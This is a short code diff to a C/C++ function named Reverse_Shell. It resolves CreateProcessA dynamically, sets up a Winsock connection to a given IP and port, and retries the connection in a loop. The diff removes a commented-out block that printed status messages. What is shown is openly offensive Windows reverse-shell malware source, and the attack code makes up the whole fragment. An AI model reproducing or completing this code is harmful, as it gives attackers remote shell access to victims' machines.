@@ -27,11 +27,6 @@ void Reverse_Shell(const char* IP_Address , int Port)
     CreateProcessPrototype hCreateProcessA = (CreateProcessPrototype)GetProcAddress(hkernel32, "CreateProcessA");
    
 
- 
-
-
-  
-
     WSADATA wsaData;
 
     // Call WSAStartup()
@@ -51,16 +46,6 @@ void Reverse_Shell(const char* IP_Address , int Port)
     sa.sin_port = htons(Port);
 
     // Call connect()
-    /*
-    int connect_Result = connect(mysocket, (struct sockaddr*)&sa, sizeof(sa));
-    if (connect_Result != 0) {
-        std::cout << "[-] connection failed.";
-        EXIT_FAILURE;
-    }
-    else
-        std::cout << "[-] Reverse Shell Established"<<std::endl;
-    */
-
     while (true)
     {
        int connect_Result=connect(mysocket, (struct sockaddr*)&sa, sizeof(sa));
